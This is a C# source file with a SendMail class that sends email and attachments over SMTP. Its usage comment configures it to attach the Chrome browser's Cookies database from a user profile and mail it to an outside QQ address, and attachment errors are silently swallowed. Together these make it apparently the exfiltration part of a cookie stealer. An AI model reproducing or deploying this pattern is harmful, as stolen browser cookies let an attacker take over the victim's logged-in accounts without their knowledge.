using System;
using System.Text;
using System.Windows.Forms;
using System.Net.Mail;

/*
使用示例：
SendMail mail = new SendMail();
mail.mailFrom = "xxxx@qq.com";
mail.mailPwd = "*******";
mail.mailSubject = "用例执行结果";
mail.mailBody = @"D:\.log";
mail.isbodyHtml = false;
mail.host = "smtp.qq.com";
mail.attachmentsPath = new string[] { @"C:\Users\think\AppData\Local\Google\Chrome\User Data\Default\Cookies" };
mail.mailToArray = new string[] {"xxxxxx@qq.com"};
mail.mailCcArray = new string[] { };
mail.Send()
*/

namespace Flich
{
    public class SendMail
    {
        // 发送者
        public string mailFrom { get; set; }

        /// 收件人
        public string[] mailToArray { get; set; }

        /// 抄送
        public string[] mailCcArray { get; set; }

        /// 标题
        public string mailSubject { get; set; }

        /// 正文
        public string mailBody { get; set; }

        /// 发件人密码
        public string mailPwd { get; set; }

        /// SMTP邮件服务器
        public string host { get; set; }

        /// 正文是否是html格式
        public bool isbodyHtml { get; set; }

        /// 附件
        public string[] attachmentsPath { get; set; }

        public bool Send()
        {
            //使用指定的邮件地址初始化MailAddress实例
            MailAddress maddr = new MailAddress(mailFrom);
            //初始化MailMessage实例
            MailMessage myMail = new MailMessage();

            //向收件人地址集合添加邮件地址
            if (mailToArray != null)
            {
                for (int i = 0; i < mailToArray.Length; i++)
                {
                    myMail.To.Add(mailToArray[i].ToString());
                }
            }
            //向抄送收件人地址集合添加邮件地址
            if (mailCcArray != null)
            {
                for (int i = 0; i < mailCcArray.Length; i++)
                {
                    myMail.CC.Add(mailCcArray[i].ToString());
                }
            }
            //发件人地址
            myMail.From = maddr;

            //电子邮件的标题
            myMail.Subject = mailSubject;

            //电子邮件的主题内容使用的编码
            myMail.SubjectEncoding = Encoding.UTF8;

            //电子邮件正文
            myMail.Body = mailBody;

            //电子邮件正文的编码
            myMail.BodyEncoding = Encoding.Default;

            myMail.Priority = MailPriority.Normal;

            myMail.IsBodyHtml = isbodyHtml;

            //在有附件的情况下添加附件
            if (attachmentsPath != null && attachmentsPath.Length > 0)
            {
                Attachment attachFile = null;
                foreach (string path in attachmentsPath)
                {
                    try
                    {
                        attachFile = new Attachment(path);
                        myMail.Attachments.Add(attachFile);
                    }catch(Exception err)
                    {

                    }
                }
            }

            SmtpClient smtp = new SmtpClient();
            //指定发件人的邮件地址和密码以验证发件人身份
            smtp.Credentials = new System.Net.NetworkCredential(mailFrom, mailPwd);

            //设置SMTP邮件服务器
            smtp.Host = host;

            try
            {
                //将邮件发送到SMTP邮件服务器
                smtp.Send(myMail);
                return true;

            }
            catch (System.Net.Mail.SmtpException exception)
            {
                MessageBox.Show(exception.Message, "异常消息提示：", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return false;
            }

        }
    }
}